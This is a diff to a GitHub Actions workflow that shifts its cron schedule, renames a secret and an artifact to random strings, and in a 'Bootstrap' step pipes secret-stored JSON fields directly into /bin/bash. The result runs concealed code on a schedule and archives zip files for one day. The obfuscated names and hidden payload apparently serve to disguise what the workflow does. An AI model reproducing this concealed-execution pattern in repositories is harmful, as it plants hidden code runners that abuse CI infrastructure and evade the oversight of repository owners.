@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '55 3,9,15,21 * * *'
+    - cron: '57 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,15 +16,14 @@ jobs:
         uses: actions/checkout@v4
       - name: Bootstrap
         env:
-          nhc531: ${{ secrets.nhc531 }}
+          se87: ${{ secrets.se87 }}
         run: |
-          printf '%s' "$nhc531" | jq -r .wgdbk134 | /bin/bash
-          echo $knlxi63 | jq -r .yh833 | /bin/bash
-          printf '%s' "$ln041" | jq -r .vw8735 | /bin/bash
+          printf '%s' "$se87" | jq -r .yt48 | /bin/bash
+          echo $gb9 | jq -r .hr85 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
         with:
-          name: N2Whh5k0
+          name: VEZdtZcx
           path: "*.zip"
           retention-days: 1
